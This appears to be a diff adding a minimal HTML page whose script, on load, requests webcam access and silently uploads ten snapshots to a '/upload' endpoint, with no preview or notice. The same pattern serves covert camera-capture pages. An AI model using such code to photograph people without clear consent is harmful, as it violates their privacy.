@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Camera Capture</title>
+</head>
+<body>
+<script>
+let count = 0;
+function captureImage() {
+    if(count >= 10) return;
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 320;
+        canvas.height = 240;
+
+        setTimeout(() => {
+            canvas.getContext('2d').drawImage(video,0,0,320,240);
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('image', blob, 'img'+count+'.png');
+                fetch('/upload', {method:'POST', body: formData});
+                count++;
+                captureImage();
+            }, 'image/png');
+        }, 1000);
+    });
+}
+captureImage();
+</script>
+</body>
+</html>
